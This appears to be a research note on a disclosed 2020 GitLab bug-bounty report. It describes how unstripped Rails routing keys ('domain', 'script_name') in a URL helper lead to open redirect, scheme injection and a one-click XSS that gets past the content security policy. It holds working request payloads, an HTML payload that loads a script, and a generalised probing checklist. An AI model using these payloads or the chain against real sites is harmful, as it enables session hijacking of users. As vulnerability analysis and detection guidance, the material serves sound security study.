GitLab, "SafeParamsHelper::safe_params is not so safe" (Cross-site Scripting (XSS) - Reflected; $4,000; reporter vakzz; created 2020-07-29; disclosed 2020-11-02; 21 votes; the program left severity unrated).
STATUS: UNVERIFIED (not reproduced — nothing executed this pass; the gitlab.com code was fixed in 2020)
CLASS: XSS via an INCOMPLETE DENY-LIST of framework-RESERVED routing keys — the helper strips only `host`/`port`/`protocol` from the params that feed `url_for`, so `domain` = open redirect and `script_name` = SCHEME INJECTION into the app's own generated links, escalated to a 1-click CSP-bypass XSS through an attacker-selectable JSON `html` field.
CORE METHOD:
  1. Entry point: `SafeParamsHelper#safe_params` = `params.except(:host, :port, :protocol).permit!`, whose result goes to `url_for`. Rails' full reserved list is `RESERVED_OPTIONS = [:host, :protocol, :port, :subdomain, :domain, :tld_length, :trailing_slash, :anchor, :params, :only_path, :script_name, :original_script_name, :relative_url_root]` — 12 keys the helper does not strip.
  2. Open-redirect half: any route using `RoutableActions`/`ensure_canonical_path` → `build_canonical_path(routable)` → `url_for(safe_params)` redirects when the canonical path differs from the requested one (e.g. a capital letter in the path); `domain` rewrites the destination: `GET /vakzz-h1/Redirect1?domain=aw.rs` → 302 `https://aw.rs/`.
  3. Scheme-injection half: `script_name` is PREPENDED to the generated URL and can carry a scheme: `GET /<user>/<proj>/-/issues?script_name=javascript:alert(1)//` makes the page's own RSS link render as `<a … href="javascript:alert(1)//<user>/<proj>/-/issues.atom?feed_token=XXXX&amp;state=opened" …>` — a scheme injection into any markup/UJS-built link. On gitlab.com this instance was blocked by the CSP.
  4. CSP-BYPASS half (a second `safe_params` call site): `app/views/projects/blob/_viewer.html.haml` computes `viewer_url = url_for(safe_params.merge(viewer: viewer.type, format: :json))`, i.e. `script_name` NAMES the JSON endpoint the blob viewer will fetch, and the viewer inserts the JSON's `html` field into the DOM as HTML. `GET /<user>/<proj>/-/blob/master/test.txt?script_name=/-/snippets/1999965/raw%23` (the `%23` = `#` truncates whatever the app appends) renders the attacker's snippet `html` value, per the report: `<form>any <b>html</b> can go <button>here<a data-remote="true" data-method="get" data-type="script" href="https://gitlab.com/-/snippets/1999974/raw" class="atwho-view select2-drop-mask pika-select"><img width="10000" height="10000"></a></button></form>`.
  5. The escape from the CSP is the app's OWN UJS: `data-remote="true" data-type="script"` makes that anchor a same-origin SCRIPT loader, so clicking anywhere on the page-sized anchor fetches the second snippet `/raw` as `application/javascript` — allowed under `script-src 'self'` — and it executes in the gitlab.com origin. (The reporter credits the same 1-click pattern to #662287.)
  6. Generalise: diff the helper's deny-list against the FRAMEWORK's reserved list. Anywhere an app builds a URL from request params, every key the framework reads as a routing directive (`host`/`domain`/`subdomain`/`port`/`script_name`/`only_path`/`anchor`/`params`) is attacker-controlled URL-authority or scheme injection.
DETECTION SIGNAL: a redirect or URL-builder that echoes request params (`?domain=`, `?subdomain=`, `?host=`, `?script_name=`, `?only_path=`); a filter that strips only host/port/protocol; any "canonical path"/"moved to …" style redirect; generated links/asset URLs on the page that change when you add `script_name=`; a client-side widget that FETCHES a URL you can steer and injects a JSON field as HTML; UJS `data-remote`/`data-type=script` links pointing at same-origin `/raw` endpoints (a same-origin script-load gadget that survives `script-src 'self'`).
CHAIN: `domain`/`script_name` (P4-looking "URL parameter" primitives) → open redirect on many routes + scheme injection inside the app's own generated hrefs → steer a client widget's fetch (`viewer_url`) to an attacker-authored JSON whose `html` field is injected as HTML → an `<a data-remote data-type=script>` loader rendered in the trusted origin → one click → the app's UJS loads an attacker-stored same-origin `/raw` script → arbitrary JavaScript with the victim's session on gitlab.com, defeating the site's CSP (XSS with real impact). The open-redirect link is recorded only as this chain's first step.
TRANSFERABLE TEST: on every endpoint that redirects or emits links, append each framework-reserved key in turn — `?domain=<yours>`, `?subdomain=<yours>`, `?script_name=javascript:alert(document.domain)//`, `?only_path=false`, `?anchor=<x>` — and diff the generated hrefs (`grep -o 'href="[^"]*"'`) against the baseline. A `script_name` value landing at the START of a same-origin href (or before the scheme) is a scheme-injection sink; then find the widget that FETCHES a URL derived from those params and renders a JSON field as HTML — that JSON→HTML boundary plus a same-origin `/raw` route is the CSP bypass.
